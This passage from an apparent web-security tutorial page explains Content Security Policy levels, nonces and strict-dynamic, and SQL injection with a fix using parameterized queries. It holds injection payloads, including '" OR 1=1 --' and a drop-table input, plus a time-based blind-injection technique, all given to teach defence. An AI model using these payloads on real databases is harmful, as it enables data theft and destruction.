+<p>An overview of the allowed values are listed below:</p>
+<ul>
+<li>none, Won't allow loading of any resources</li>
+<li>self, Only allow resources from the current origin</li>
+<li>unsafe-inline, Allow use of inline resources</li>
+<li>Host, Only allow loading of resources from a specific host, also can add the path part. e.g. <code>*.a.com</code>, <code>b.com/c/</code></li>
+<li>Scheme, Only allow loading resources over a specific scheme. e.g. <code>http:</code>, <code>https:</code>, <code>data:</code></li>
+</ul>
+<h4 id="csp-level-2">CSP Level 2<a class="headerlink" href="#csp-level-2" title="Permanent link">&para;</a></h4>
+<p>Unsurprisingly, such a CSP policy is wildly incompatible with many applications. Even today, we often rely on inline code blocks to load JavaScript code into application. CSP Level 2 aims to make CSP more compatible with real-world applications without compromising security. It introduces two mechanims: hashes and nonces.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;hello&quot;</span><span class="p">&gt;</span>Say Hello!<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;DOMContentLoaded&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;hello&quot;</span><span class="p">)</span>
+<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="w">      </span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Hello!&quot;</span><span class="p">)});</span>
+<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="p">})</span>
+<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+For this simplified example, if we use hashes mechanims, we need to calculates the hash of the script block and add it to the CSP policy.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="err">Content-Security-Policy: script-src &#39;sha256-6X6+1K/DKkKDJXeIXoOfaIX+FzybN9LaGtutkR5DWpQ=&#39;</span>
+</code></pre></div>
+If you change any charactor of the script, the hashes will need to update. So typically we do not calculate these hashes manually.If you load application in a Chromium-based browser, you can find the expected hash in the error messages of the developer console, as shown below:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;self&#39;&quot;.
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-6X6+1K/DKkKDJXeIXoOfaIX+FzybN9LaGtutkR5DWpQ=&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution.
+</code></pre></div></p>
+<p>The nonces mechanims need you configured both script block and CSP policy with a nonce attribute and with same value.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Content-Security-Policy: script-src &#39;nonce-1f40e4a23493&#39;
+</code></pre></div>
+It supports both inline codes and remote code files.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://analytics.example.com/1.js&quot;</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;1f40e4a23493&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+Nonces should be generated from a cryptographically secure random source and should never be re-used. Otherwise, an attacker can predict the nonce and include a valid nonce on injected code blocks.</p>
+<h4 id="strict-dynamic">strict-dynamic<a class="headerlink" href="#strict-dynamic" title="Permanent link">&para;</a></h4>
+<p>The CSP above has an issue, which is many real-world CSP policies contain patterns that allow an attacker to bypass the policy. <a href="https://research.google/pubs/pub45542/" target="_blank">This famous paper</a> descripe how to bypass the policy. The paper recommends abandoning URL-based policies in favor of hash-based and nonce-based policies.</p>
+<p>To make this work, we need a mechanism to enable cascading JavaScript loading. So, the <code>strict-dynamic</code> comes. If we set this keyword to our CSP policy, it tells the browser: If you encouter a script that was loaded with a hash or a nonce, you can allow that script to load remote code dependencies by inserting additional script elements into the page. </p>
+<p>Since <code>strict-dynamic</code> was introduced to counter URL-based bypass attacks, it is incompatible with URLs. <code>strict-dynamic</code> only allow scripts that have been approved with a nonce or a hash to load additional resources. In fact, when a browser encounters <code>strict-dynamic</code>, it will automatically ignore URL-based expressions.</p>
+<h4 id="universal-csp-policy">Universal CSP Policy<a class="headerlink" href="#universal-csp-policy" title="Permanent link">&para;</a></h4>
+<p>How you build a policy depends a bit on your specific situation. But we can refer to Google's policy, which offers effective protection against XSS vulnerablities without potentially breaking any of their applications. The snippet is formatted for readablity:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="err">Content-Security-Policy: </span>
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="err">  script-src &#39;report-sample&#39; &#39;nonce-3YCIqzKGd5cxaIoTibrW/A&#39; &#39;unsafe-inline&#39;</span>
+<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="err">             &#39;strict-dynamic&#39; https: http: &#39;unsafe-eval&#39;;</span>
+<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="err">  object-src &#39;none&#39;;</span>
+<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="err">  base-uri &#39;self&#39;;</span>
+<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="err">  report-uri /webchat/_/cspreport</span>
+</code></pre></div>
+<p>A modern browser see this policy, will recognizes the nonce which causes the <code>unsafe-inline</code> keyword to be ignored. It will also recognizes <code>strict-dynamic</code>, which causes any URL-based expressions(i.e., <code>http: https:</code>) to be ignored.</p>
+<p>The legacy browsers that only support CSP Level 2, or even Level 1 , will see a different policy which will ignore <code>strict-dynamic</code> or <code>nonces</code>. Maybe cause some XSS attack, but the application is still work well.</p>
+<h2 id="sql-injection">SQL Injection<a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h2>
+<p>The SQL injection's goal is execute arbitrary queries to the database via a vulnerable application.Read sensitive data from the database, modify database data, execute administration operations on the database, and sometimes issue commands to the operating system.</p>
+<p>This kind of attack is possible when an application combines unsafe user supplied data(like forms, cookies, HTTP headers, etc.) with a SQL query "template".</p>
+<h3 id="attack-example_1">Attack Example<a class="headerlink" href="#attack-example_1" title="Permanent link">&para;</a></h3>
+<h4 id="common-example">Common example<a class="headerlink" href="#common-example" title="Permanent link">&para;</a></h4>
+<p>Think about this vulnerable code:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span>
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`SELECT * FROM users WHERE username = &quot;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&quot;`</span>
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span>
+<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">results</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">  </span><span class="c1">// user exists!</span>
+<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">results</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span>
+<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="w">  </span><span class="c1">// success</span>
+<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="p">}</span>
+</code></pre></div>
+The expected input is <code>{username: 'larry'}</code>, but malicious input is <code>{username: '" OR 1=1 --'}</code>. The <code>--</code> is a SQL comment, will comment any sql statement after it, and the <code>1=1</code> will always be true.
+So the result is:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span>
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="w"> </span><span class="c1">// { username: &#39;&quot; OR 1=1 --&#39;, password: &#39;...&#39; }</span>
+<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`SELECT * FROM users WHERE username = &quot;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&quot;`</span>
+<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="w"> </span><span class="c1">// SELECT * FROM users WHERE username = &quot;&quot; OR 1=1 --&quot;</span>
+<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span>
+<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="w"> </span><span class="c1">// all rows in the users table!</span>
+<a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">results</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="w"> </span><span class="c1">// will always be true!</span>
+<a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="p">}</span>
+</code></pre></div>
+The attacker will get all the user table data. How about the malicious input <code>{username: '";drop table users --'}</code>?</p>
+<h4 id="blind-sql-injection">Blind SQL injection<a class="headerlink" href="#blind-sql-injection" title="Permanent link">&para;</a></h4>
+<p>When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. The web app may be configured to show generic error messages instead of printing useful data to the user, but still vulnerable to SQL injection.</p>
+<p>There are two kinds of blind SQL injection. One is Content-based, if the page responds differently depending on if the query matches something or not, attacker can use this to ask "yes or no" questions.The other is Time-based, make the database pause for a specified amount of time when the query matches something, otherwise return immediately, different timings are observable by attacker.</p>
+<p>Let's take a look at Time-based sql injection. We can use a slow SQL expression, like <code>SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))</code>. Then use a SQL if-statement(CASE) to run the slow expression only when the answer to our question is <code>true</code>, like <code>SELECT CASE expression WHEN cond THEN slow ELSE speedy END</code>. Then we change the username or other things in the cond to get what is key information.</p>
+<h3 id="defenses">Defenses<a class="headerlink" href="#defenses" title="Permanent link">&para;</a></h3>
+<p>The sql injection defenses key idea is never build SQL queries with string concatenation.Instead, we can use Parameterized SQL, or use an Object Relational Mappers(ORMs).</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">// Vulnerable code:</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`SELECT * FROM users WHERE username = &quot;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&quot;`</span>
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
+<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="c1">// Safe code:</span>
+<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="kd">const</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;SELECT * FROM users WHERE username = ?&#39;</span>
+<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="p">)</span>
+</code></pre></div>
+This will automatically handle escaping untrusted user input for you. ORM do this either.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/hjlarry" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="mailto:ultrahe@gmail.com" target="_blank" rel="noopener" title="" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M64 112c-8.8 0-16 7.2-16 16v22.1l172.5 141.6c20.7 17 50.4 17 71.1 0L464 150.1V128c0-8.8-7.2-16-16-16H64zM48 212.2V384c0 8.8 7.2 16 16 16h384c8.8 0 16-7.2 16-16V212.2L322 328.8c-38.4 31.5-93.7 31.5-132 0L48 212.2zM0 128c0-35.3 28.7-64 64-64h384c35.3 0 64 28.7 64 64v256c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V128z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/hjlarry" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://paypal.me/hjlarry" target="_blank" rel="noopener" title="paypal.me" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M111.4 295.9c-3.5 19.2-17.4 108.7-21.5 134-.3 1.8-1 2.5-3 2.5H12.3c-7.6 0-13.1-6.6-12.1-13.9L58.8 46.6c1.5-9.6 10.1-16.9 20-16.9 152.3 0 165.1-3.7 204 11.4 60.1 23.3 65.6 79.5 44 140.3-21.5 62.6-72.5 89.5-140.1 90.3-43.4.7-69.5-7-75.3 24.2zM357.1 152c-1.8-1.3-2.5-1.8-3 1.3-2 11.4-5.1 22.5-8.8 33.6-39.9 113.8-150.5 103.9-204.5 103.9-6.1 0-10.1 3.3-10.9 9.4-22.6 140.4-27.1 169.7-27.1 169.7-1 7.1 3.5 12.9 10.6 12.9h63.5c8.6 0 15.7-6.3 17.4-14.9.7-5.4-1.1 6.1 14.4-91.3 4.6-22 14.3-19.7 29.3-19.7 71 0 126.4-28.8 142.9-112.3 6.5-34.8 4.6-71.4-23.8-92.6z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate", "content.tabs.link", "content.tooltips", "navigation.indexes", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.8fd75fb4.min.js"></script>
+      
+    
+  </body>
+</html>
